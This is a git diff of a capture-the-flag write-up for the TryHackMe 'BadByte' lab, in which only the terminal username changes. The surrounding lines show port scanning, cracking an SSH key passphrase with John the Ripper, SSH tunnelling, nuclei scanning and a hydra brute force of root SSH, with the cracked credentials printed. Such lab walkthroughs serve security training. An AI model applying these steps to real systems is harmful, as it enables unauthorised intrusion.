@@ -13,7 +13,7 @@ Deploy The VM. Infiltrate BadByte and help us to take over root.
 First we add the room on /etc/hosts file then we use [Rustscan](../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy]
 └─$ rustscan -a 10.10.152.27 -- -A 
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
 | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
@@ -26,7 +26,7 @@ ________________________________________
  --------------------------------------
 To scan or not to scan? That is the question.
 
-[~] The config file is expected to be at "/home/hax/.rustscan.toml"
+[~] The config file is expected to be at "/home/mdn0x/.rustscan.toml"
 [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
 [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
 Open 10.10.152.27:22
@@ -49,7 +49,7 @@ We access [FTP](../../3%20-%20Tags/Hacking%20Concepts/FTP.md) and download the f
 We use [Ssh2john](../../3%20-%20Tags/Hacking%20Tools/Ssh2john.md) python script convert private key to hash :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/BadByte]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/BadByte]
 └─$ ssh2john id_rsa > pass.hash 
 ```
 
@@ -58,7 +58,7 @@ We use [Ssh2john](../../3%20-%20Tags/Hacking%20Tools/Ssh2john.md) python script 
 Now we crack the hash with [JohnTheRipper](../../3%20-%20Tags/Hacking%20Tools/JohnTheRipper.md) :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/BadByte]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/BadByte]
 └─$ john pass.hash --wordlist=/usr/share/wordlists/rockyou.txt
 
 Press 'q' or Ctrl-C to abort, almost any other key for status
@@ -103,7 +103,7 @@ To achieve local port forwarding, we need to execute some commands:
 The first command is used to give the private key the appropriate permissions (so only us can use it). In simplest terms, it would make SSH login possible :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/BadByte]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/BadByte]
 └─$ chmod 600 id_rsa 
 ```
 
@@ -111,7 +111,7 @@ The second command is used to set up Dynamic port forwarding. In simple words, i
 We will enter `cupcake` as passphrase :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/BadByte]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/BadByte]
 └─$ ssh -i id_rsa -D 1337 errorcauser@10.10.152.27       
 
 Enter passphrase for key 'id_rsa': 
@@ -145,7 +145,7 @@ Now, we are able to scan the internal services of the machine with [Nmap](../../
 On our local machine, execute the command:
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/BadByte]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/BadByte]
 └─$ sudo  proxychains nmap -sT 127.0.0.1
 ```
 
@@ -168,7 +168,7 @@ We have HTTP and MYSQL service open in the internal network.
 We can access them through port forwarding with SSH — in this case we will access the HTTP :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/BadByte]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/BadByte]
 └─$ ssh -i id_rsa -L 8080:127.0.01:80 errorcauser@10.10.152.27
 Enter passphrase for key 'id_rsa': 
 
@@ -193,7 +193,7 @@ Wordpress [CMS](../../3%20-%20Tags/Hacking%20Concepts/CMS.md) .
 We can use [Nuclei](../../3%20-%20Tags/Hacking%20Tools/Nuclei.md) to scan the target for vulnerabilities :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/BadByte]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/BadByte]
 └─$ nuclei -u http://127.0.0.1:8080
 
                      __     _
@@ -347,7 +347,7 @@ Script done on 2021-03-23 21:07:03+0000
 We can create a custom wordlist with [Cupp](../../3%20-%20Tags/Hacking%20Tools/Cupp.md) :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/BadByte]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/BadByte]
 └─$ cupp -i
 
   cupp.py!                 # Common
@@ -400,7 +400,7 @@ We can create a custom wordlist with [Cupp](../../3%20-%20Tags/Hacking%20Tools/C
 Let's try if this password is reused (slightly modified) for root access on [SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md) :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/BadByte]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/BadByte]
 └─$ hydra -l root -P good.txt 10.10.152.27 ssh -v   
 
 'G00dP@$sw0rd2021'
